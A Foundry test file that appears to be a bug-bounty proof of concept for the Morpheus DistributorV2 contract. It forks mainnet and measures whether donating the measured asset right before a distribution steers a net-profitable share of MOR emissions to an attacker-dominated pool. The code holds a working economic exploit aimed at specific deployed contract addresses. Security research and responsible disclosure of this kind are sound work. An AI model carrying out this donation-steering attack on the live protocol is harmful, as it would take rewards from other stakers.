// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

// =================================================================================
//  T-2 — Morpheus bug bounty (terms v2, mor.org/bug-bounty), Session 2.
//
//  Candidate C-1: DistributorV2.distributeRewards measures each deposit pool's
//  "yield" as the RAW balance growth of the pool's measured asset at the
//  Distributor (aToken for AAVE pools, the token itself for NONE pools):
//
//      balance_ = IERC20(yieldToken).balanceOf(address(this))
//      underlyingYield_ = max(0, balance_ - lastUnderlyingBalance)
//      yield_ = underlyingYield_ * tokenPrice
//      pool emission = yields_[i] / totalYield * periodRewards
//
//  Nothing distinguishes organic yield (Lido rebase / Aave interest) from a
//  plain transfer donation. A dominant staker of a small pool can donate the
//  measured asset to the Distributor just before a distribution and capture a
//  matching share of the period's fixed MOR emission. The donation itself is
//  swept to protocol PoL by _withdrawYield, so the donation is a real cost:
//  the candidate lives ONLY if the fork proves NET profit.
//
//  Dedup posture (dedup-gate.md): RISKY. The donation-counted-as-yield
//  primitive is publicly documented in the Code4rena QA report (item [01]).
//  What is NOT documented there: a net-profit, cross-pool emission-steering
//  execution. This PoC is therefore an economics proof, not just a mechanism
//  proof: it prints the full (window x donation) P&L matrix and asserts a
//  strictly positive best net.
//
//  Kill criteria (pre-committed, test-plan.md Session 2):
//   (a) net P&L <= 0 at every donation size and window (the PoL sweep eats
//       the gain) -> lane dead; the economics test FAILS with "KILL (a)".
//   (b) deployed distributeRewards does not move the target pool's emission
//       share when its measured balance grows (i.e. deployed code does not
//       use raw balances) -> lane dead on behaviour; the steering assertion
//       FAILS with "KILL (b)".
//
//  Discipline notes (same as Session 1):
//   - Pranks impersonate ONLY addresses this test creates (the attacker).
//     deal() funds the attacker: that models "attacker has capital", which
//     the report states explicitly as a precondition + cost. No protocol
//     account (owner, multisig, L1Sender) is ever impersonated.
//   - Only the EXTERNAL Chainlink aggregators are mocked, and only to
//     re-publish their own pin-block answers with fresh timestamps after a
//     time warp (harness note (a) in the Session 1 pack). Morpheus code is
//     never mocked, stored into, or etched.
//   - Scenario state is kept in contract storage (s_*) so function frames
//     stay small; the legacy and IR pipelines both rejected a fat version.
// =================================================================================

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function depositToken() external view returns (address);
    function distributor() external view returns (address);
    function usersData(address user_, uint256 rewardPoolIndex_)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function depositPoolAddresses(uint256 rewardPoolIndex_, uint256 i) external view returns (address);
    function depositPools(uint256 rewardPoolIndex_, address pool_)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
    function distributedRewards(uint256 rewardPoolIndex_, address pool_) external view returns (uint256);
    function minRewardsDistributePeriod() external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256 rewardPoolIndex_) external view returns (uint128);
    function rewardPool() external view returns (address);
    function chainLinkDataConsumer() external view returns (address);
    function aavePoolAddressesProvider() external view returns (address);
}

interface IRewardPool {
    function getPeriodRewards(uint256 rewardPoolIndex_, uint128 startTimestamp_, uint128 endTimestamp_)
        external
        view
        returns (uint256);
}

interface IChainLinkDataConsumer {
    function dataFeeds(bytes32 pathId_, uint256 i) external view returns (address);
    function getPathId(string calldata path_) external view returns (bytes32);
    function allowedPriceUpdateDelay(address feed_) external view returns (uint256);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IAggregatorV3 {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

interface IAavePoolAddressesProvider {
    function getPool() external view returns (address);
}

interface IAavePool {
    function supply(address asset_, uint256 amount_, address onBehalfOf_, uint16 referralCode_) external;
}

contract T2_DonationSteeringTest is Test {
    // ------------------------- Deployed targets --------------------------------------
    address internal constant DISTRIBUTOR_ADDR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    // DistributorV2 implementation (ABI-checked against repo main in study Phase 2;
    // the probe asserts the proxy's EIP-1967 slot matches this).
    address internal constant DISTRIBUTOR_IMPL = 0x52f76e8be3dFABcC3b0DEd02882A22BE47DADE03;
    bytes32 internal constant EIP1967_IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    uint256 internal constant IDX = 0; // public reward pool index

    // Study reference pin (2026-10-25). RE-PIN before running: see setup.md S2-4.
    uint256 internal constant FORK_BLOCK = 26_273_884;

    // MOR/USD price * 1e18 for the P&L conversion. Source: CoinGecko (Morpheus
    // AI page), read 2026-10-25 21:28 EDT (Session 1). Refresh at report time;
    // used for the P&L verdict, so the runbook requires re-checking it the
    // same day the economics test is run.
    uint256 internal constant MOR_USD_PRICE_E18 = 888003612739160100;

    // ------------------------- VERIFY-FIRST GATE -------------------------------------
    // Run test_T0_PoolProbe first. Pick the smallest-USD-TVL pool whose strategy
    // is not NO_YIELD, set its DepositPool contract address here, and only then
    // run the economics test. (Same gate pattern as Session 1.)
    address internal constant TARGET_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;

    // Donation ladder, in USD * 1e18, converted to token units at the pin price.
    uint256 internal constant DONATION_USD_1 = 250 ether;
    uint256 internal constant DONATION_USD_2 = 1000 ether;
    uint256 internal constant DONATION_USD_3 = 4000 ether;

    // ------------------------- Wired contracts ---------------------------------------
    IDistributor internal distributor;
    IRewardPool internal rewardPool;

    // ------------------------- Scenario state (storage, not stack) -------------------
    address internal s_token;
    uint8 internal s_strategy;
    address internal s_aToken;
    uint8 internal s_tokDec;
    uint256 internal s_deposited;
    uint256 internal s_priceE18;
    IDepositPool internal s_pool;
    address internal s_attacker;

    /// @dev Matrix bests, carried in ONE memory slot (a struct reference) -
    /// storage is rolled back by revertToState and wide tuples overflow the
    /// stack; both failure modes were hit during the Session 2 runs.
    struct Bests {
        int256 net;
        uint256 attack;
        uint256 control;
    }

    // ------------------------- Raw-call ERC20 helpers ----------------------------------
    // Several pool tokens (USDT) return no bool from approve/transfer, which
    // breaks typed-interface decoding. The call must succeed; the return
    // value is intentionally ignored.
    function _approve(address token_, address spender_, uint256 amount_) internal {
        (bool ok,) = token_.call(abi.encodeWithSignature("approve(address,uint256)", spender_, amount_));
        require(ok, "approve call failed");
    }

    function _transfer(address token_, address to_, uint256 amount_) internal {
        (bool ok,) = token_.call(abi.encodeWithSignature("transfer(address,uint256)", to_, amount_));
        require(ok, "transfer call failed");
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
        distributor = IDistributor(DISTRIBUTOR_ADDR);
        rewardPool = IRewardPool(distributor.rewardPool());
    }

    // =================================================================================
    // T-0 (Session 2): read-only probe. Verifies the Distributor proxy identity,
    // logs the distribution timing state, the period emission at several window
    // lengths, and every index-0 pool (the TARGET_POOL choice + donation asset
    // come from this output).
    // =================================================================================
    function test_T0_PoolProbe() public {
        address impl = address(uint160(uint256(vm.load(DISTRIBUTOR_ADDR, EIP1967_IMPL_SLOT))));
        console2.log("distributor proxy:", DISTRIBUTOR_ADDR);
        console2.log("implementation (EIP-1967 slot):", impl);
        assertEq(impl, DISTRIBUTOR_IMPL, "V-T2-1: distributor implementation differs from the studied one");

        uint256 minPeriod = distributor.minRewardsDistributePeriod();
        uint128 lastCalc = distributor.rewardPoolLastCalculatedTimestamp(IDX);
        console2.log("minRewardsDistributePeriod (s):", minPeriod);
        console2.log("rewardPoolLastCalculatedTimestamp:", uint256(lastCalc));
        console2.log("block.timestamp at pin:", block.timestamp);
        console2.log("seconds since lastCalc:", block.timestamp - uint256(lastCalc));

        console2.log("period rewards if distributed now:", rewardPool.getPeriodRewards(IDX, lastCalc, uint128(block.timestamp)));
        console2.log(
            "period rewards at +7d:", rewardPool.getPeriodRewards(IDX, lastCalc, uint128(block.timestamp + 7 days))
        );
        console2.log(
            "period rewards at +30d:", rewardPool.getPeriodRewards(IDX, lastCalc, uint128(block.timestamp + 30 days))
        );

        _logPoolsAndFeeds();

        console2.log("PROBE DONE - choose TARGET_POOL (smallest USD TVL, strategy != 1) and set it in the test file.");
    }

    // =================================================================================
    // T-2: the economics proof. Attacker dominant-stakes the target pool; for
    // each (window, donation) cell: CONTROL distribution vs DONATION
    // distribution from identical snapshot state; print the P&L row; verdicts
    // at the end (steering assert = kill (b) check; best-net assert = kill (a)).
    // =================================================================================
    function test_T2_SteeringEconomics() public {
        require(TARGET_POOL != address(0), "GATE: set TARGET_POOL from the probe output first");
        _loadTarget();
        _setupAttacker();
        // NOTE: bests are tracked in memory, never in storage - revertToState
        // rolls back this contract's storage too (learned from the first run:
        // storage-tracked bests were wiped by every branch revert).
        Bests memory best = Bests(type(int256).min + 1, 0, 0); // min+1: verdict abs() cannot overflow
        _runMatrix(best);

        console2.log("=== T-2 VERDICT ===");
        console2.log("best attack pool distributedRewards:", best.attack);
        console2.log("matching control distributedRewards:", best.control);
        console2.log("best NET (USD 1e18, abs):", uint256(best.net < 0 ? -best.net : best.net));
        console2.log("best NET negative?:", best.net < 0);

        assertGt(
            best.attack,
            best.control,
            "KILL (b): donation did not move the pool's emission share - deployed code does not book raw-balance growth as yield"
        );
        assertTrue(
            best.net > 0,
            "KILL (a): donation-steered emission is net-negative at every size/window (PoL sweep eats the gain) - lane dead"
        );
        console2.log("T-2 PASSED: steering is real in deployed code AND at least one (window, donation) cell is net-profitable.");
    }

    // ---- scenario phases -----------------------------------------------------------

    function _loadTarget() internal {
        (s_token, , , s_deposited, , s_strategy, s_aToken, ) = distributor.depositPools(IDX, TARGET_POOL);
        require(s_strategy != 1, "GATE: target pool is NO_YIELD - donations cannot book as yield; pick another pool");
        s_pool = IDepositPool(TARGET_POOL);
        require(s_pool.depositToken() == s_token, "pool contract token mismatch");
        s_tokDec = IERC20Min(s_token).decimals();
        s_priceE18 = _pinPrice();
        require(s_priceE18 > 0, "pin price unavailable (stale feed at pin?) - re-pin to a fresher block");
        console2.log("target pool:", TARGET_POOL);
        console2.log("token:", s_token);
        console2.log("strategy (0=NONE,1=NO_YIELD,2=AAVE):", s_strategy);
        console2.log("deposited at pin (token units):", s_deposited);
        console2.log("token USD price (1e18) at pin:", s_priceE18);
    }

    function _pinPrice() internal view returns (uint256) {
        (, string memory p, , , , , , ) = distributor.depositPools(IDX, TARGET_POOL);
        IChainLinkDataConsumer consumer = IChainLinkDataConsumer(distributor.chainLinkDataConsumer());
        return consumer.getChainLinkDataFeedLatestAnswer(consumer.getPathId(p));
    }

    function _setupAttacker() internal {
        s_attacker = makeAddr("t2-attacker");
        uint256 stakeAmt;
        if (s_deposited > 0) {
            stakeAmt = s_deposited * 9; // -> 90% of the pool after staking
        } else {
            stakeAmt = _usdToToken(10_000 ether);
        }
        uint256 fundAmt = stakeAmt + _usdToToken(DONATION_USD_1 + DONATION_USD_2 + DONATION_USD_3);
        deal(s_token, s_attacker, fundAmt);

        vm.startPrank(s_attacker);
        _approve(s_token, TARGET_POOL, stakeAmt);
        // AAVE-strategy pools: DepositPool.stake delegates the pull to
        // Distributor.supply, which safeTransferFrom's as the DISTRIBUTOR -
        // so the allowance must cover the distributor too (USDT throws 0xfe
        // on insufficient allowance; observed in the first economics run).
        _approve(s_token, DISTRIBUTOR_ADDR, stakeAmt);
        s_pool.stake(IDX, stakeAmt, uint128(block.timestamp + 365 days), address(0));
        vm.stopPrank();

        (, uint256 atkDeposited,,,,,,,) = s_pool.usersData(s_attacker, IDX);
        (, , , uint256 depositedAfter,,,,) = distributor.depositPools(IDX, TARGET_POOL);
        uint256 shareBps = (atkDeposited * 10_000) / depositedAfter;
        console2.log("attacker stake (token units):", stakeAmt);
        console2.log("attacker pool share (bps):", shareBps);
        require(shareBps >= 8000, "setup: attacker is not dominant (>=80%) in the target pool");
    }

    function _runMatrix(Bests memory best) internal {
        uint256 minPeriod = distributor.minRewardsDistributePeriod();
        uint256 snap = vm.snapshotState();
        for (uint256 w = 0; w < 3; w++) {
            snap = _runWindow(_window(w, minPeriod), snap, best);
        }
    }

    function _runWindow(uint256 window, uint256 snap, Bests memory best) internal returns (uint256 liveSnap) {
        (uint256 controlMOR, uint256 controlShare) = _measureControl(window);
        vm.revertToState(snap);
        uint256 snap2 = vm.snapshotState();

        for (uint256 d = 0; d < 3; d++) {
            uint256 donationUSD = _ladder(d);
            (uint256 attackMOR, uint256 attackShare) = _measureAttack(window, _usdToToken(donationUSD));

            int256 gainMOR = int256(attackMOR) - int256(controlMOR);
            int256 gainUSD = (gainMOR * int256(MOR_USD_PRICE_E18)) / 1e18;
            int256 netUSD = gainUSD - int256(donationUSD);

            console2.log("--- window (s):", window);
            console2.log("    donation (USD 1e18):", donationUSD);
            console2.log("    control attacker MOR:", controlMOR);
            console2.log("    attack  attacker MOR:", attackMOR);
            console2.log("    pool distributedRewards control:", controlShare);
            console2.log("    pool distributedRewards attack :", attackShare);
            console2.log("    gain (MOR wei, abs):", uint256(gainMOR < 0 ? -gainMOR : gainMOR));
            console2.log("    gain sign negative?:", gainMOR < 0);
            console2.log("    NET (USD 1e18, abs):", uint256(netUSD < 0 ? -netUSD : netUSD));
            console2.log("    NET sign negative?:", netUSD < 0);

            if (netUSD > best.net) best.net = netUSD;
            if (attackShare > best.attack) {
                best.attack = attackShare;
                best.control = controlShare;
            }
            vm.revertToState(snap2);
            snap2 = vm.snapshotState();
        }
        return snap2;
    }

    function _measureControl(uint256 window) internal returns (uint256 controlMOR, uint256 controlShare) {
        vm.warp(block.timestamp + window);
        _freshenFeeds();
        distributor.distributeRewards(IDX);
        controlMOR = s_pool.getLatestUserReward(IDX, s_attacker);
        controlShare = distributor.distributedRewards(IDX, TARGET_POOL);
    }

    function _measureAttack(uint256 window, uint256 donationTok)
        internal
        returns (uint256 attackMOR, uint256 attackShare)
    {
        vm.warp(block.timestamp + window);
        _donate(donationTok);
        _freshenFeeds();
        distributor.distributeRewards(IDX);
        attackMOR = s_pool.getLatestUserReward(IDX, s_attacker);
        attackShare = distributor.distributedRewards(IDX, TARGET_POOL);
    }

    // ---- small pure helpers ----------------------------------------------------------

    function _window(uint256 i, uint256 minPeriod) internal pure returns (uint256) {
        uint256 w0 = minPeriod + 1 hours;
        uint256 w1 = 7 days > w0 ? 7 days : w0 + 1 days;
        if (i == 0) return w0;
        if (i == 1) return w1;
        return 30 days > w1 ? 30 days : w1 + 7 days;
    }

    function _ladder(uint256 i) internal pure returns (uint256) {
        if (i == 0) return DONATION_USD_1;
        if (i == 1) return DONATION_USD_2;
        return DONATION_USD_3;
    }

    function _usdToToken(uint256 usdE18) internal view returns (uint256) {
        return (usdE18 * (10 ** uint256(s_tokDec))) / s_priceE18;
    }

    /// @dev Deliver the donation in the asset the Distributor actually measures:
    /// the token itself for NONE pools; the pool's aToken for AAVE pools (the
    /// attacker first supplies the underlying to Aave and donates the aTokens
    /// received - exactly the capital path available to a real attacker).
    function _donate(uint256 amountTok) internal {
        if (s_strategy == 2) {
            address aavePool = IAavePoolAddressesProvider(distributor.aavePoolAddressesProvider()).getPool();
            vm.startPrank(s_attacker);
            _approve(s_token, aavePool, amountTok);
            IAavePool(aavePool).supply(s_token, amountTok, s_attacker, 0);
            uint256 aBal = IERC20Min(s_aToken).balanceOf(s_attacker);
            _transfer(s_aToken, DISTRIBUTOR_ADDR, aBal);
            vm.stopPrank();
        } else {
            vm.prank(s_attacker);
            _transfer(s_token, DISTRIBUTOR_ADDR, amountTok);
        }
    }

    /// @dev Harness note (a) - identical to Session 1: after a time warp,
    /// re-publish every Chainlink aggregator's own pin-block answer with a
    /// fresh updatedAt. Only the external oracle contracts are mocked.
    function _freshenFeeds() internal {
        IChainLinkDataConsumer consumer = IChainLinkDataConsumer(distributor.chainLinkDataConsumer());
        uint256 freshened = 0;

        for (uint256 i = 0; ; i++) {
            address poolAddr;
            try distributor.depositPoolAddresses(IDX, i) returns (address a) {
                poolAddr = a;
            } catch {
                break;
            }
            (, string memory p, , , , , , ) = distributor.depositPools(IDX, poolAddr);
            bytes32 pathId = consumer.getPathId(p);

            for (uint256 k = 0; ; k++) {
                address feed;
                try consumer.dataFeeds(pathId, k) returns (address f) {
                    feed = f;
                } catch {
                    break;
                }
                (uint80 roundId, int256 answer, uint256 startedAt, , uint80 answeredInRound) =
                    IAggregatorV3(feed).latestRoundData();
                vm.mockCall(
                    feed,
                    abi.encodeWithSignature("latestRoundData()"),
                    abi.encode(roundId, answer, startedAt, block.timestamp, answeredInRound)
                );
                freshened++;
            }
        }
        console2.log("feeds freshened (pin-block answers, current timestamp):", freshened);
    }

    /// @dev Probe helpers: every index-0 pool's configuration, its measured-asset
    /// balance at the Distributor, and the yield already accrued at the pin.
    /// Split into per-pool / per-feed frames to stay under the stack limit.
    function _logPoolsAndFeeds() internal view {
        console2.log("--- index-0 deposit pools (at pin) ---");
        for (uint256 i = 0; ; i++) {
            address poolAddr;
            try distributor.depositPoolAddresses(IDX, i) returns (address a) {
                poolAddr = a;
            } catch {
                break;
            }
            _logPool(poolAddr);
        }
    }

    function _logPool(address poolAddr) internal view {
        (address tok, string memory p, uint256 tokenPrice, uint256 deposited, uint256 lastBal, uint8 strategy, address aToken, ) =
            distributor.depositPools(IDX, poolAddr);
        console2.log("pool:", poolAddr);
        console2.log("  token:", tok);
        console2.log("  chainLinkPath:", p);
        console2.log("  strategy (0=NONE,1=NO_YIELD,2=AAVE):", strategy);
        console2.log("  aToken:", aToken);
        console2.log("  deposited:", deposited);
        console2.log("  lastUnderlyingBalance:", lastBal);
        console2.log("  stored tokenPrice:", tokenPrice);
        address yieldAsset = strategy == 2 ? aToken : tok;
        console2.log("  distributor measured-asset balance:", IERC20Min(yieldAsset).balanceOf(DISTRIBUTOR_ADDR));
        console2.log("  depositToken() check:", IDepositPool(poolAddr).depositToken());
        _logFeeds(p);
    }

    function _logFeeds(string memory p) internal view {
        IChainLinkDataConsumer consumer = IChainLinkDataConsumer(distributor.chainLinkDataConsumer());
        bytes32 pathId = consumer.getPathId(p);
        for (uint256 k = 0; ; k++) {
            address feed;
            try consumer.dataFeeds(pathId, k) returns (address f) {
                feed = f;
            } catch {
                break;
            }
            (, int256 answer, , uint256 updatedAt, ) = IAggregatorV3(feed).latestRoundData();
            console2.log("  feed:", feed);
            console2.log("    allowedPriceUpdateDelay:", consumer.allowedPriceUpdateDelay(feed));
            console2.log("    latest answer:", uint256(answer));
            console2.log("    latest updatedAt:", updatedAt);
        }
    }
}
